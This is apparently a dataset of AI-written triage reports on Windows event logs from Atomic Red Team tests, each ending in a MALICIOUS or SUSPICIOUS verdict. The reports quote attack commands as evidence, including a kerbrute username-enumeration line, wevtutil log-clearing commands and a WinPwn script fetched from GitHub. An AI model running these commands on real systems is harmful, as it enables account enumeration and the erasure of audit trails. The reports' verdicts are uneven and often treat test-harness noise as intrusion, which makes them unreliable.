   - The logs show execution of `cmd.exe` with `nslookup` querying DNS SRV records (`_ldap._tcp.dc._msdcs`) which might mean an attempt to discover domain controller information. This activity could be part of a reconnaissance phase by an attacker to gather network information.

4. **High Privilege Usage and Integrity Level**:
   - The logs show processes running with high integrity levels, indicating administrative privileges. Combined with suspicious activity like log clearing and system querying, this suggests possible unauthorized administrative access.

5. **Absence of Expected PowerShell Logs**:
   - The absence of detailed PowerShell logs or benign PowerShell activities can be linked to prior cleared PowerShell logs, which is another indicator of suspicious activity.

6. **Frequent Use of `conhost.exe`**:
   - The frequent spawning of `conhost.exe` (Console Window Host) linked to the processes run by `admin_test`, while potentially legitimate, is commonly seen as part of activity related to command-line operations that could include hidden execution or command obfuscation.

**Assessment and Resolution**: 

Based on the analysis, the activities logged are highly suspicious, focusing on log clearing and potential information gathering. While there is no direct indication of a malware execution, the clearing of logs coinciding with the utilization of system utilities in such a manner is indicative of attempts to potentially cover up actions within the system.

Thus, the resolution for these logs is **SUSPICIOUS**. Further investigation is needed, focusing on potential unauthorized administrative access, checking for any security vulnerabilities in the system, and examining any additional corroborating evidence, like network traffic logs, to determine if malicious activity occurred. It's vital to perform an in-depth forensic analysis of the machine to gather more conclusive evidence of any malicious activity."

#### Key Observations:
1. **Event Log Clearing:** 
   - Multiple instances of log clearing were noted (EventID 104 in the System log and EventID 1102 in the Security log). The log clearing was executed by the `admin_test` user, which is a significant red flag. This kind of activity is often associated with attempts to cover up tracks after suspicious or malicious activities.
   
2. **wevtutil.exe Usage:**
   - The use of `wevtutil.exe` to clear logs (specifically Sysmon, Application, Security, and Windows PowerShell channels) is evident in the Sysmon logs. This utility is being executed multiple times by the `admin_test` account with a high integrity level, which suggests privilege context usage.

3. **Use of Command Utilities:**
   - Commands such as `cmd.exe` with suspicious usage of `net accounts`, alongside `whoami.exe` and `hostname.exe`, are carried out in a short span. This kind of activity is typical when an attacker is attempting reconnaissance post-compromise to gather system and user information or adjust system settings.

4. **EdgeUpdate Activities:**
   - Numerous entries associated with Microsoft Edge updates are present. These appear to be legitimate update activities carried out by the `NT AUTHORITY\SYSTEM`. However, amid the suspicious context of log clearance and the presence of administrative actions, it’s essential to ensure these processes were not altered or spoofed.

#### Assessment:
- **Log Clearing:** Indicates potentially malicious intent to hide activity.
- **Process Execution Context:** High integrity level and usage of system-level tools by user `admin_test` could imply privilege escalation or lateral movement post-compromise.
- **Command Execution:** The sequence of commands suggests reconnaissance efforts or privilege escalation attempts.
  
#### Conclusion:
Given the suspicious nature of the logs cleared using `wevtutil.exe`, especially across multiple channels including Security and Sysmon, combined with the command-line usage and process execution patterns, these logs suggest potential malicious activity.

Upon analyzing the provided logs, several entries indicate suspicious activity that merits further investigation, and possibly constitutes malicious behavior.

#### Key Points of Suspicious Activity:

1. **PowerShell Execution and Command Details:**
   - Several instances of PowerShell execution (Sysmon EventID 1 and PowerShell Event logs) show the execution of a potentially suspicious script:
     - Command executed: `powershell.exe & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\"", .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\username.txt""}`
     - This command suggests the use of `kerbrute.exe`, a known tool for Kerberos brute-forcing to enumerate user names, possibly indicating an attempt to gather user credentials from Active Directory.

2. **Log Clearing Events:**
   - System (EventID 104) and Security (EventID 1102) logs show that logs were cleared by the `admin_test` user.
     - The intention to clear logs can be indicative of nefarious activity aiming to cover tracks and erase audit trails, suggesting potentially malicious actions were taken by the `admin_test` user or an adversary using this account.

3. **Execution and Parent Process Correlation:**
   - `wevtutil.exe cl` commands executed against several logs (Sysmon Log EventID 1 and EventID 5 entries), combined with the subsequent PowerShell execution, and the clearing logs suggest the use of native Windows binaries for possibly malicious intent (""living off the land"" tactics).

4. **Highly Privileged Process Execution:**
   - Processes like `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Program Files\\RUXIM\\RUXIMICS.exe` executed with high integrity levels and potentially in a context that is not regular or expected, further signaling risky behavior.

### Final Assessment

Based on the PowerShell execution attempting to enumerate usernames using a suspicious tool and the subsequent clearing of logs, these behaviors collectively suggest a concerted attempt to perform reconnaissance followed by stealth operations on the system. These indicators align with tactics associated often with malicious actors.

### Resolution: **MALICIOUS**

### Recommendations:

  - Educate users, particularly administrators, about avoiding the execution of untrusted scripts and ensuring system integrity.
  - Continuously update and inform them about potential indicators of compromise and preemptive actions. 

By taking these steps, the organization can better protect against potential security threats, address the current situation, and mitigate risks moving forward."
WinPwn - bluekeep,"Based on the provided logs, here is a detailed analysis of the activity observed on the system:

1. **Log Clearing Activities:**
   - The security event log (EventID 1102), system log, and PowerShell log entries indicate that logs were cleared by the user ""admin_test"". This is a significant red flag as the clearing of logs is commonly associated with an attempt to cover up malicious activity.

2. **Privilege Escalation:**
   - EventID 4672 shows that the user ""admin_test"" was granted a series of high-level privileges including SeDebugPrivilege, SeBackupPrivilege, and others, which are often sought after in privilege escalation scenarios. While this may not directly indicate malicious activity, combined with other indicators, it raises suspicions.

3. **Process Execution:**
   - Multiple entries in the Sysmon logs show executions of `wevtutil.exe` to clear event logs for the Security, System, and PowerShell channels. Use of `wevtutil cl` to clear logs is a known tactic by threat actors to cover their tracks.
   - The Sysmon log (EventID 1 and 5) indicates execution of a PowerShell script downloaded from a GitHub URL: `S3cur3Th1sSh1t/WinPwn`. This specific script suggests potentially malicious intent as it is associated with a known offensive security tool, which implies it could be used to exploit vulnerabilities or gather information post-compromise.

4. **Use of PowerShell:**
   - The PowerShell log entries also show suspicious activity with scripts executed non-interactively, focusing on security compromise functions (e.g., ""bluekeep"" mentioned in the command line).

5. **Time Manipulation:**
   - The logs indicate changes in system time which can be used to manipulate time stamps on logs and files, further complicating digital forensics. This adds to the suspicion level.

**Assessment:**
The combination of cleared logs, elevated privileges granted to ""admin_test,"" execution of suspicious PowerShell scripts, and time manipulation strongly indicate an attempt to compromise or exploit the system. These activities together form a pattern consistent with malicious actor behavior aiming to stealthily access, control, or disrupt the system.

**Resolution: MALICIOUS**
- The activities observed in the logs are consistent with malicious behavior, including log clearing, privilege exploitation, and execution of known attack scripts.
- Immediate action is recommended to isolate the affected system, conduct a thorough forensic analysis, and review and strengthen security policies and practices to prevent further incidents.
- It may also be prudent to review other systems for similar activities and ensure all are up to date with security patches.

**Guidance:**
- Investigate any unauthorized access, particularly by the user ""admin_test"".
- Review the system configuration, access controls, and user privileges.
- Assess and update incident response protocols to improve detection and management of similar events in the future."
Process Discovery - tasklist,"After a thorough analysis of the provided Windows event logs, here is the detailed assessment:

**Suspicious or Anomalous Behavior:**

1. **Clearing of Event Logs:**
   - Multiple event log clearing actions were detected (Event ID 104 from the System log and Event ID 1102 from the Security log). 
   - The logs show that the user ""admin_test"" executed commands to clear the System, Windows PowerShell, and Security logs using the process wevtutil.exe with the commmand ""cl"". 
   - Clearing event logs is a known tactic used by attackers to cover their tracks and is generally considered suspicious, especially if not part of regular administrative maintenance.

2. **Multiple Execution of System Utilities:**
   - The execution of traditional system utilities like `hostname.exe`, `whoami.exe`, and `cmd.exe` with `tasklist`, which are typically benign but can signal unwanted or malicious actions if used in a suspicious context.
  
3. **Time Change Events:**
   - There are logged events indicating a change in system time (Event ID 4616), which sometimes might be leveraged by an attacker to manipulate event logs or the system state for their benefit.

4. **Repetitive Execution of `wevtutil.exe`:**
   - The `wevtutil.exe` is executed several times to clear multiple logs, which aligns with an attempt to hide actions on the system.
    
**Indicators of Malicious Activity or Compromise:**

- The most significant indicator of potential malicious activity is the systematic clearing of the System, Windows PowerShell, and Security event logs using the `wevtutil.exe` utility. This action is executed using high-integrity level command lines, suggesting privilege escalation or usage of an administrative account to perform these tasks.

**Assessment and Conclusion:**

Based on the observed event patterns, particularly the clearing of event logs and the sequential execution of processes typically associated with reconnaissance or cover-up operations, these actions elevate the risk of potential malicious activities.

Therefore, the resolution for this investigation is:

**MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Incident Response:**
   - Initiate a security incident response to investigate and contain any real threat. This includes isolating the compromised system from the network to prevent lateral movement or further unauthorized activities.

2. **Forensic Analysis:**
   - Conduct a detailed forensic analysis to understand the full scope of the compromise, focusing on detecting the initial point of intrusion and potential data exfiltration or further compromise.

3. **Accounts Review:**
   - Evaluate the user account (""admin_test"") for unauthorized activities or compromises, including a review of authentication logs and any password changes or anomalies.

4. **Audit Unusual Activity:**
   - Audit recently accessed files and network connections during the timeframe to identify the attacker’s objective or further data access attempts.

5. **Remediation Steps:**
   - Apply necessary patches, update anti-virus definitions, and enforce stronger access controls while monitoring for recurring suspicious behavior.

6. **Review and Strengthen Security Policies:**
   - Consider implementing Logging and Monitoring best practices to prevent log tampering and detect suspicious activities early."
Applications Installed,"Upon analysis of the Windows event logs provided for the Windows machine ""Server002,"" several activities and events stand out, potentially indicating suspicious or malicious activity:

1. **Event Log Clearance:**
   - There are multiple events with EventID 104 in the System log indicating that logs for different channels (System, Windows PowerShell, etc.) have been cleared. Similarly, EventID 1102 in the Security log also indicates that the security log has been cleared. These actions were performed by the user ""admin_test.""
   - The execution of the `wevtutil.exe cl` command for clearing logs is logged under Sysmon events. This event is significant because log clearance attempts are often associated with malicious activity to hide traces.

2. **Unusual PowerShell Activity:**
   - The PowerShell logs record the execution of a PowerShell script that retrieves software installation details from the registry (EventID 600). Although fetching installed software information might be legitimate, when combined with log clearance activity, it raises suspicion.

3. **Process Execution Patterns:**
   - The Sysmon logs demonstrate the execution of potentially non-malicious processes (`whoami`, `hostname`), but their presence alongside log-clearing activities could suggest information-gathering steps during a reconnaissance phase of an attack.
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` running, which are directly associated with event log clearance.

Overall, the combination of event log clearance actions, the use of administrative scripts (PowerShell), and typical command-line tools (like `wevtutil.exe`) in close temporal proximity to each other suggests an attempt to perform activities without leaving evidence on the host system. While no explicit malware samples or network-based anomalies were detected in the logs, the nature of the activities raises substantial concerns.

**Resolution: SUSPICIOUS**

Given the evidence, it is recommended to:
- Conduct a deeper forensic analysis on the machine ""Server002"" to verify if any unauthorized changes have been made.
- Check for any unauthorized or illicit access patterns, and review the security posture of user accounts, especially ""admin_test.""
- Implement stricter monitoring and alerting on similar events to detect possible future attempts at log tampering or unauthorized PowerShell usage.
- Educate users on security policies and ensure all systems are updated with the latest security patches to avoid exploitation through unpatched vulnerabilities."
Enumerate Active Directory Computers with Get-AdComputer,"Upon thorough examination of the provided Windows event logs, several indicators suggest potentially malicious activity. Here are the key findings and assessments for the activity observed:

1. **Log Clearance Events**: 
   - There are multiple log clearance events (`EventID 104` in System log and `EventID 1102` in Security log) with the user `admin_test`. Usage of the `wevtutil.exe` command to clear logs (`cl`) is a known tactic used by attackers to cover their tracks after unauthorized activities.

2. **Suspicious Use of PowerShell**: 
   - The PowerShell logs indicate the execution of a command (`Get-AdComputer -Filter *`) via `powershell.exe`, which may be legitimate in certain contexts. However, coupled with the log clearance events and the user `admin_test`, this usage needs further scrutiny, as PowerShell can be leveraged for malicious purposes, such as reconnaissance in an attack framework.

3. **Account Operations**:
   - There are multiple credential-related events (`EventID 5379` in Security log) showing failed authentications or an attempt to access Microsoft accounts with return codes suggesting issues (`ReturnCode 3221226021`).

4. **Windows Defender Events**: 
   - Windows Defender is reported to be operational, and there are updates (`KB2267602`) being installed. This activity in isolation seems normal, but examining it in the context of manual updates could be an attempt to manipulate or disable protections, though no direct evidence suggests this.

5. **Process Execution Context**:
   - Processes such as `wevtutil.exe` and `conhost.exe` are executed with a high integrity level by the user `admin_test`. While these are standard processes, their frequent and specific execution patterns (particularly for clearing logs) suggest misuse.

**Assessment**: Based on the evaluation of these logs:
- The log clearance activity, especially coupled with the high-frequency execution of PowerShell, raises red flags for potential compromise or attempts to obfuscate malicious actions.
- The presence of these log clearance events, particularly the usage of `wevtutil.exe`, is highly suspicious.

**Resolution**: **MALICIOUS**

**Guidance**:
- Conduct a thorough investigation into the activities of the user `admin_test`, including checking for any unauthorized access or changes.
- Review security policies and access controls to ensure such actions are monitored in the future.
- Implement and review logging practices, ensuring that log clearances or notable security events trigger alerts for immediate review.
- Examine network activity and systems for any potential breaches or lateral movements, as this could be a part of a larger attack strategy.
"
Network Share Discovery command prompt,"**Detailed Analysis:**

1. **Time Anomalies:**
   - The Kernel-General and Security logs show events where system time was changed, indicating possible time manipulation. This is often done by attackers to cover their tracks or to bypass time-based security mechanisms.

2. **Clearing of Event Logs:**
   - Events from the System (EventID 104) and Security (EventID 1102) logs indicate that log files were cleared by the user 'admin_test'. Clearing event logs is a common tactic used by attackers to erase traces of their activities.

3. **Use of Administrative Tools:**
   - **Processes:** Multiple uses of `wevtutil.exe` by the user ""admin_test"" to clear logs such as Application, System, and Security. Clearing logs with `wevtutil` indicates an attempt to manipulate or delete logs.
   - **Integrity Level:** All suspect processes maintain a ""High"" integrity level, suggesting elevated privileges.

4. **Command-Line Executions:**
   - A suspicious command using `cmd.exe` was executed with `net view \\\\localhost`. This command is typically used to enumerate shared resources and could be reconnaissance activity preceding lateral movement.

5. **Unusual Process Relationships:**
   - The sequence of processes involving `MicrosoftEdgeUpdate.exe` is extensive but appears to relate mainly to legitimate application behavior. However, frequent mentions of `MicrosoftEdgeUpdate.exe` could be worth correlating against official update times to confirm legitimacy.

6. **High-Integrity Privileges:**
   - The Security log shows an event where the user ""admin_test"" utilized extensive privileges, including `SeDebugPrivilege` and others, which are sensitive and can be used for malicious actions such as dumping memory or manipulating system settings.

**Assessment:**

The logs present several red flags:
- Time manipulation and log clearance attempts by user ""admin_test"" are highly suspicious activities indicative of someone attempting to conduct or cover up a security breach.
- The sequence of process executions and elevated privileges usage combined with unusual commands (e.g., using `cmd.exe`) and system time manipulation aligns with known malicious tactics.

**Recommendation:**

Resolution: **MALICIOUS**

1. **Immediate Actions:**
   - Conduct a thorough investigation of the user ""admin_test"" to determine if credentials have been compromised.
   - Implement monitoring to detect any further time modifications and logging activities.
   - Review endpoint protection and network logs for additional evidence of malicious activity, such as successful lateral movement or data exfiltration.

2. **Containment and Eradication:**
   - Reset passwords and terminate active sessions associated with 'admin_test.'
   - Perform thorough malware scans on the host to ensure no persistent threats.
   - Review other systems for similar log clearance patterns or time discrepancies.

3. **Recovery and Lessons Learned:**
   - Re-establish normal time settings and restore cleared logs from backups if possible.
   - Enhance security awareness training and review administrative access policies."
System Information Discovery (2),"Upon analyzing the event logs provided, here’s a detailed assessment of the situation:

### Indicators of Malicious Activity:
- **Clearing of Event Logs:** There are multiple instances where event logs have been cleared. Specifically:
  - The System log was cleared by the user ""admin_test"" as per EventID 104 in the System logs.
  - The Security log was cleared by the same user ""admin_test"" as indicated by EventID 1102 in the Security logs.
  - The Windows PowerShell event logs were cleared shortly before a suspicious PowerShell script was executed.
  
- **Usage of `wevtutil.exe`:** The `wevtutil` command-line utility was used to clear event logs for the System, Security, and Windows PowerShell channels, as evidenced by its execution in the Sysmon logs. This is a known tactic used by malicious actors to cover their tracks by deleting event log entries that could potentially reveal evidence of unauthorized activity.

- **Execution of Suspicious Commands:**
  - There is a pattern of executing system/network reconnaissance commands and tools like `wmic`, `cmd`, and `PowerShell`. For instance, the PowerShell command involved collecting comprehensive information about the system network adapters, IP configurations, DNS settings, and more. The batch of network-related commands resembles activity patterns associated with data gathering before executing more harmful actions.
  - The use of scripts and batch commands located within user directories and temp locations, combined with log clearing, suggests an attempt to obfuscate unauthorized activities.
  
- **Time Discrepancy Events:** There are a couple of events (EventID 4616) showing unauthorized changes or anomalies in the system time settings, which can be indicative of an attempt to bypass scheduled security measures or log time discrepancies.

### Conclusion:
Given the collection of activities primarily involving the clearing of logs and the methodical reconnaissance from a potentially compromised account with high integrity levels, there is strong evidence of malicious intent. 

### Resolution:
- **MALICIOUS** - The logs contain activities that are a clear indication of malicious behavior.

### Recommendations:
1. **Immediate Containment:** Isolate the affected system from the network to prevent lateral movement or further data exfiltration.
2. **Forensic Investigation:** Collect and preserve all available logs and system state information for further forensic analysis.
3. **Credential Audits:** Reset credentials for the compromised accounts and review account activity histories across other systems.
4. **Security Enhancements:** Implement improved monitoring, increase frequency of log backups, and enhance security controls for PowerShell and system utilities usage.
5. **Conduct Incident Response:** Engage the incident response team to conduct a thorough investigation and eliminate any persistent threats.

By taking these steps, you can mitigate risk and prevent further damage from the malicious actions detected."
WinPwn - Dotnetsearch,"After thoroughly analyzing the provided log entries from different sources such as the Application, System, Security, Windows PowerShell, and Sysmon logs, I've identified some significant findings that point toward potentially malicious activity:

1. **Event Log Clearing**: 
   - In the System log, there are multiple entries with Event ID 104 indicating that logs were cleared in the System and Windows PowerShell channels by the user `admin_test`. This action is suspicious as it could indicate attempts to cover up malicious activities or make post-event investigations difficult.

2. **Suspicious PowerShell Activity**:
   - Multiple PowerShell log entries show PowerShell execution that references an external script located at `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This action is highly suspicious as it involves downloading and executing a script from a potentially untrusted source online, which is often indicative of malicious activity, such as exploitation frameworks or information gathering scripts.

3. **Process Execution with Elevated Privileges**:
   - Sysmon logs show the execution of multiple system utilities, such as `wevtutil` for clearing logs, which were executed with high integrity levels by `admin_test`. This user appears to have performed actions consistent with a privilege escalation attempt or post-exploitation activities.

4. **Frequent Edge Update Executions**:
   - There are many entries related to Microsoft Edge Update in the Sysmon logs, which in itself might not be critical. However, the context of its frequent execution could be leveraged for persistence if combined with other illicit activities, especially given the suspicious PowerShell activity.

Based on these observations, the following assessment and guidance are offered:

**Assessment:**

The logs indicate potentially malicious activity primarily due to the script execution from an external source and event log clearing actions by a local admin user. These behaviors align with common tactics used by attackers during the initial compromise, privilege escalation, or lateral movement stages of a cyber attack.

**Resolution: MALICIOUS**
 
Given the evidence, the activity reported in these logs can be classified as malicious. Immediate action should be taken to contain the potential compromise.

**Guidance on How to Proceed:**
1. Immediately isolate the affected host to prevent any further spread of a potential threat.
2. Conduct a deeper investigation into the user's actions, particularly focusing on the `admin_test` account. Verify if this account was compromised.
3. Review and revoke any unauthorized permissions or accesses that might have been granted.
4. Inspect the network for any additional traces of the script or similar downloads, indicating spread.
5. Enable enhanced logging and monitoring to catch any further anomalies across the network.
6. Consider conducting a full threat hunting exercise to verify if such actions are isolated or part of a broader campaign.

These steps should help identify the extent and intention behind the observed behavior, allowing appropriate responses to mitigate the threat fully."
Display group policy information via gpresult,"Upon reviewing the provided logs, several findings indicate potentially suspicious or malicious activities. Here's the detailed analysis: 

### Suspicious/Anomalous Behavior:
1. **Log Clearing Events:**
   - The security event ID 1102 in the Security log indicates that the event log was cleared by the user `admin_test`. This action is suspicious as attackers often clear logs to cover their tracks after compromising a system.
   - The system log entries with event ID 104 show that `admin_test` also cleared the System and Windows PowerShell logs. This is additional evidence pointing towards potential log tampering.

2. **Usage of Wevtutil:**
   - Numerous instances of the `wevtutil.exe` command were executed by the user `admin_test`, with high integrity level, to clear logs (e.g., ""wevtutil.exe cl Security""). This is a tool often used to manage logs but is also known to be misused by attackers for covering their tracks.

3. **Time Change Events:**
   - Events in both the Security and System logs show system time being set back. This activity could be used to thwart time-based defensive mechanisms or to adjust logs after tampering.

4. **Execution of Whoami and Cmd with Elevated Permissions:**
   - `whoami.exe` was executed by `admin_test`, showing high integrity level, suggesting a check of the currently executing user in a privileged context.
   - A command `gpresult /z` executed via `cmd.exe` with high integrity level – potentially used for gathering detailed policy information, which might indicate reconnaissance behavior.

5. **Frequent Execution of EdgeUpdate:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` are noted with SYSTEM-level privileges. While Edge Update's regular execution is typical for maintaining software, the frequency and the repeated use of various registry and server configurations may warrant further investigation.

### Indicators of Malicious Activity or Compromise:
- **Combination of Log Clearing, Wevtutil Usage, and Elevated Command Execution:**
   - The combination of evidence such as log clearing, usage of `wevtutil.exe`, and elevated execution of commands like `whoami` alongside system and application monitoring (`gpresult`) suggests a pattern often seen in post-exploitation scenarios.

### Assessment and Guidance:
Based on the above indicators, the logs present strong evidence that suggests potential malicious activity, particularly in the context of unauthorized log and system time manipulation, likely aimed at evading detection.

**Resolution: MALICIOUS**

### Recommendations to Proceed:
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent further unauthorized actions.
   
2. **Investigation and Remediation:**
   - Perform a thorough forensic analysis to determine the full extent of the compromise and root causes.

   - Restore system logs from the backup for timeline reconstruction.

3. **Monitoring and Enhancements:**
   - Implement stricter access controls and logging mechanisms to monitor high-privilege accounts.
   - Consider deploying additional intrusion detection/prevention systems to identify and respond to similar activities in real-time. 

This analysis should guide the security team into the next steps for containment, remediation, and prevention of future incidents."
Query Registry,"After thorough analysis of the provided Windows event logs, several activities stand out, suggesting potential malicious behavior:

1. **Deletion of Event Logs**: 
   - The Security log (EventID 1102) and the System log (EventID 104) indicate that event logs were cleared, which is a strong indicator of malicious activity as attackers often delete logs to cover their tracks.
   
2. **Unusual Use of System Utilities**: 
   - Multiple entries show the use of `wevtutil.exe` with the command-line arguments to clear specific event logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", ""Windows PowerShell""). This is not typical behavior for legitimate user actions, especially when combined with log deletions.

3. **Suspicious Registry Queries**: 
   - There are numerous instances of `reg.exe` and `cmd.exe` being used to query registry keys associated with startup items, services, and userinit entries. Such extensive registry querying could indicate information gathering or preparation for persistence mechanisms.

4. **Process Integrity Level**:
   - Many processes executed with a high integrity level, suggesting administrative privileges. While not unusual for an admin account, its combination with processes clearing logs and querying sensitive registry keys is concerning.

5. **Command-line Arguments**:
   - The use of `cmd.exe` with intricate command lines for querying multiple registry paths is also suspicious, pointing towards enumeration scripts or potential scripts aiming to modify or extract data from registry keys.

**Assessment**:
The activities noted, including clearing event logs, extensive abnormal use of system utilities for querying registry entries, and the execution of processes with high integrity, collectively suggest potentially malicious activities rather than benign administrative tasks.

**Resolution**:
- **MALICIOUS**: The clearing of logs, accompanied by suspicious command usage and registry queries, strongly indicates malicious intent to obfuscate actions and potentially prepare or maintain persistence within the system.

**Guidance**:
- Immediately isolate the affected system ""Server002"" for further forensic investigation.
- Review network connections and communications for any outbound traffic to external or suspicious IP addresses.
- Conduct a thorough endpoint threat analysis using advanced threat detection solutions.
- Restore event logs where possible and implement additional logging and alerting on suspicious activities.
- Change credentials for accounts that have been compromised or suspected to be compromised.
- Plan and execute a comprehensive security audit and vulnerability assessment to prevent further incidents."

Enumerate Root Domain linked policies Discovery,"**Analysis of Logs:**

1. **Event Log Clearing Activity:**
   - Multiple instances of `wevtutil.exe` being used to clear event logs (Security, Application, System, and Windows PowerShell) are observed, all executed by the user `SERVER002\admin_test` with high integrity level.
   - This activity is highly suspicious, as clearing event logs is commonly associated with attempts to hide malicious activities.

2. **PowerShell Activity:**
   - Several PowerShell instances are started with a script that queries Active Directory information. The command in the PowerShell logs involves `adsisearcher` and querying Group Policies, which is not inherently malicious but could be used for reconnaissance purposes.
   - The script executed within PowerShell appears consistent across multiple log entries and could indicate automated or pre-planned actions.

3. **Time Change Events:**
   - The system time was adjusted slightly twice in quick succession. While not inherently malicious, this could potentially be related to obfuscating the timing of logs/events or to align events for some other purpose.

4. **System and Application Events:**
   - The logs show routine system activities associated with Microsoft Edge updates and other system services. These appear to be benign and part of normal system operations.

5. **Sysmon Log Entries:**
   - The Sysmon logs corroborate the use of `wevtutil.exe` to clear logs, describing its execution with high integrity level by the user `SERVER002\admin_test`.
   - There are multiple instances of `conhost.exe` related to `wevtutil.exe` activities across various channels indicating interaction with the system console while executing these commands.

**Assessment:**
The logs clearly show indicators of suspicious behavior:
- The repeated clearing of event logs using `wevtutil.exe`, especially across critical channels, is a significant red flag suggesting an attempt to cover tracks.
- While the PowerShell command does not inherently confirm malicious intent, in the context of log clearing, reconnaissance is plausible.

**Resolution:**
- **MALICIOUS**: Given the deliberate log clearing and potentially reconnaissance-related PowerShell activity, the collected evidence strongly suggests malicious activity. Immediate investigation and response actions are warranted.

**Guidance:**
- Conduct a thorough forensic analysis on the host `Server002` to detect any further malicious activity or data exfiltration attempts.
- Check system for unauthorized changes, backdoors, or persistent mechanisms.
- Revert any unauthorized time changes and review your monitoring policies to detect time-related anomalies.
- Enhance log monitoring and consider implementing protective measures to prevent unauthorized log clearing in the future."
Enumerate Linked Policies In ADSISearcher Discovery,"Upon analyzing the provided logs, several indicators of potentially malicious activity stand out. Let's break down the suspicious events:

1. **Event Log Clearing (Security Log 1102, Sysmon Log 1 with wevtutil.exe):**
   - The `wevtutil.exe` utility is used to clear event logs, which is a critical indicator of potential malicious activity. The security logs indicate multiple instances of log clearing for different log channels (`Security`, `System`, `Windows PowerShell`), all executed by the user `admin_test`.

2. **Use of `wevtutil.exe` and Context:**
   - The use of `wevtutil` to clear logs, specifically multiple log channels, suggests an effort to cover tracks. This behavior is highly suspicious and is typically associated with malicious activities where an attacker attempts to obfuscate their actions.

3. **Suspicious PowerShell Activity:**
   - The `PowerShell` logs show a script involving querying Active Directory Objects and potentially manipulating Group Policy Objects (GPOs). While PowerShell is a powerful tool often used in legitimate administration tasks, complex scripts especially related to GPO without proper change documentation can raise concerns.

4. **Time Change Events (System Log Kernel-General 1):**
   - Events showing changes to system time are logged, which can be suspicious if not performed as part of legitimate maintenance. Such changes might be used to manipulate timestamps to align or mask activities.

5. **Frequent Use of System Utilities (Sysmon Log with Microsoft Edge Update):**
   - There are logs indicating the use of `MicrosoftEdgeUpdate.exe` and its associated setup utility. While edge updates are normal, the timing and overlap with other suspicious activities warrant closer inspection to rule out if a legitimate update is being leveraged for execution of unauthorized activities.

**Assessment:**

- The logs indicate highly suspicious activities, including log clearing, possible time manipulation, and use of PowerShell for potentially unauthorized GPO queries. These activities are consistent with attempts to cover tracks and manipulate system behavior, suggesting a possible compromise.

**Resolution: SUSPICIOUS**

**Guidance:**
- Immediately audit the actions and access patterns of the user `admin_test`. Verify whether they have legitimate reasons for executing these commands.
- Review changes in Group Policy Objects and confirm their legitimacy.
- Network monitoring should be increased for exfiltration signs.
- Restore cleared logs if possible from backups for a comprehensive investigation.
- Consider isolating the affected system, conduct a full malware scan, and apply a security patch/update if vulnerabilities are found."
Remote System Discovery - nslookup,"After analyzing the provided logs, several key points stand out:

1. **Clearing of Event Logs**: The logs show multiple instances (EventID: 104, 1102) of event logs being cleared by the user ""admin_test"" immediately before other activities on October 21, 2024. This is generally considered suspicious behavior, as attackers often clear logs to cover their tracks after a compromise.

2. **PowerShell Activity**: There is a significant PowerShell command captured in the logs that involves iterating through potential internal IP addresses and performing DNS lookups using commands like `nslookup`. This script is launched with high integrity levels and executed from a command line within PowerShell. PowerShell scripts are often used in lateral movement or reconnaissance activities. This behavior indicates an internal network scan, which is unusual for regular user activity.

3. **Unusual Network Scanning**: The PowerShell command is performing a network scan by looping through various IP addresses in the network segment and trying to resolve them with `nslookup`. This type of activity is characteristic of network reconnaissance, potentially by an attacker looking to gather information about internal network structures and devices.

4. **Unusual Privilege Usage**: Multiple events (EventID: 4672) indicate the usage of high-level privileges like `SeDebugPrivilege` and `SeLoadDriverPrivilege` by the user ""admin_test"". While this could be legitimate for some administrative tasks, its presence among the other suspicious activities can be concerning.

**Assessment**:
- The sequential clearing of logs, execution of potentially malicious PowerShell scripts, and high privilege usage indicate signs of potential malicious activity. Although individual actions like checking who is logged in or looking up hostnames might be benign, their aggregation, especially with log cleansing, suggests a pattern aligned with malicious intent.

- Such a combination of activities - log clearance, network scanning, and high privilege usage - serves as an indicator that further investigation is warranted. It aligns with tactics often used by attackers after gaining access, intending to conduct network reconnaissance while covering tracks by clearing critical event logs.

**Resolution**: **MALICIOUS**

**Guidance**: 
1. **Immediate Isolation**: Isolate the affected machine (""Server002"") from the network to prevent further possible recon or lateral movement.
2. **Review Access Logs**: Closely review the activities of the user ""admin_test"" and investigate how these credentials were used, especially concerning external IPs and activities.
3. **Conduct a Threat Hunt**: Conduct a focused threat hunt on similar patterns across the network to identify any broader compromise.
4. **Enhance Monitoring**: Increase monitoring on PowerShell and administrative activities across all systems to detect anomalous or unauthorized access and activity.
5. **Notify Incident Response Team**: Engage with the incident response team for in-depth forensic analysis and containment strategies."
Security Software Discovery,"After a detailed examination of the logs provided, several points of interest arise that could suggest suspicious or potentially malicious activity:

### Indicators of Suspicious Activity:
1. **Event Log Clearing**: 
   - _Log Entries_: Multiple `wevtutil.exe` commands are present in the Sysmon logs clearing logs (System, Application, Windows PowerShell). For instance, `CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`. These actions are shown under the same user `admin_test`.
   - _Implication_: Regular clearing of event logs using `wevtutil.exe`, especially without a clear, legitimate reason, can be a significant indicator of malicious activity as attackers often clear logs to cover their tracks.

2. **PowerShell Activity**:
   - _Events_: Multiple PowerShell commands executed script-like queries such as `Get-Process`, `Get-Service`, and `Get-CimInstance`, all related to `Sysmon` and `System Monitor service`.
   - _Implication_: While these commands can be part of system diagnostics, frequent and similar command executions focused on security layers (like querying antivirus or monitoring services) can indicate reconnaissance activities by malware or an attacker trying to disable or evade detection measures.

3. **Time Change Events**:
   - _Events_: Time on the server was modified twice within seconds, logged as event ID `4616` in the security logs.
   - _Implication_: Time changes, especially when unexpected, can be used to manipulate time-based security controls and log timestamps, further complicating forensic analysis and investigations.

4. **Enumeration using CMD and Other Tools**:
   - _Observations_: The command `cmd.exe /c netsh.exe advfirewall...` along with frequent `tasklist.exe` and `findstr.exe` invocations suggest enumeration activities possibly looking into firewall configurations and running tasks.
   - _Implication_: Such activities are characteristic of an attacker attempting to understand the security policies in place, identify processes related to security tools, and explore avenues for lateral movement or privilege escalation.

